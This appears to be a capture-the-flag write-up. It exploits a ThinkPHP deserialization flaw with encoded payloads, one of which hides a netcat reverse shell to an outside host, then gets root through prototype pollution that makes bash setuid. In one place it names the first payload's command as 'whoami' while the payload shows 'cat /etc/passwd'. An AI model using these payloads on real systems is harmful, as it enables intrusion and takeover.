### Exploitation

Only HTTP port open, with the following number, which seems to be a version:

![](/assets/img/Pasted-image-20250126223838.png)

Then we have enough information to lookup for the name of the technology running on this port, and the only perfect match is ThinkPHP:

![](/assets/img/Pasted-image-20250126223454.png)

While investigating, I found a vulnerability CVE-2024-44902 on ThinkPHP version 8.0.4:

![](/assets/img/Pasted-image-20250126224019.png)

The payload is an image so I have to extract the data from it, the OS command within the payload is `whoami`:
```bash
x=O%3A28%3A%22think%5Croute%5CResourceRegister%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00registered%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00resource%22%3BO%3A15%3A%22think%5CDbManager%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00instance%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00config%22%3Ba%3A2%3A%7Bs%3A11%3A%22connections%22%3Ba%3A1%3A%7Bs%3A7%3A%22getRule%22%3Ba%3A2%3A%7Bs%3A4%3A%22type%22%3Bs%3A29%3A%22%5Cthink%5Ccache%5Cdriver%5CMemcached%22%3Bs%3A8%3A%22username%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22fru1ts%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22cat%20%2Fetc%2Fpasswd%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22fru1ts%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22fru1ts%22%3B%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D%7D%7Ds%3A7%3A%22default%22%3Bs%3A7%3A%22getRule%22%3B%7D%7D%7D
```

And then the payload retrieves the information as follows:

![](/assets/img/Pasted-image-20250126230927.png)

Now the interesting part here, is that you need to provide the length of the payload you want to execute (number 6 for whoami), prior to sent the payload:

![](/assets/img/Pasted-image-20250126234525.png)

So in order to get a reverse shell, we get the length of the string and then change it by the 6 instead:

![](/assets/img/Pasted-image-20250126234859.png)

This is the final payload I use:

```bash
x=O%3A28%3A%22think%5Croute%5CResourceRegister%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00registered%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00resource%22%3BO%3A15%3A%22think%5CDbManager%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00instance%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00config%22%3Ba%3A2%3A%7Bs%3A11%3A%22connections%22%3Ba%3A1%3A%7Bs%3A7%3A%22getRule%22%3Ba%3A2%3A%7Bs%3A4%3A%22type%22%3Bs%3A29%3A%22%5Cthink%5Ccache%5Cdriver%5CMemcached%22%3Bs%3A8%3A%22username%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22fru1ts%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A32%3A%22%6e%63%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68%20%31%30%2e%31%30%2e%35%2e%31%32%32%20%31%32%33%34%22%3B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22fru1ts%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22fru1ts%22%3B%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D%7D%7Ds%3A7%3A%22default%22%3Bs%3A7%3A%22getRule%22%3B%7D%7D%7D
```

### Privilege Escalation
There is a binary that can be executed as Sudo without credentials:
![](/assets/img/Pasted-image-20250126235201.png)

The content of such binary is this:
![](/assets/img/Pasted-image-20250126235216.png)

There is a Prototype Pollution vulnerability on `@bit/loader`:

![](/assets/img/Pasted-image-20250126235402.png)

After several attempts and also a good chatGPT aid, I came with the following payload:
```bash
www-data@brainrot:/$ sudo /usr/local/bin/bitrot '{"__proto__": {"is_admin": true, "properties": {"username": "ebbg", "cmd": "require(\"child_process\").exec(\"chmod +s /bin/bash\")"}}}'

```
That allows us to run `/bin/bash` as root:
```bash
www-data@brainrot:/$ /bin/bash -p
bash-5.2# whoami
root
```

### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`environment variables (env command)`
`/root`


### Credentials

No credentials were found on this machine.

### Notes

-  For Prototype Pollution attacks, specially if this are crafted with JSON, it is really important to escape key chars such as doble quote ("), because the payload sometimes is not working while trying to exploit this vulnerability.
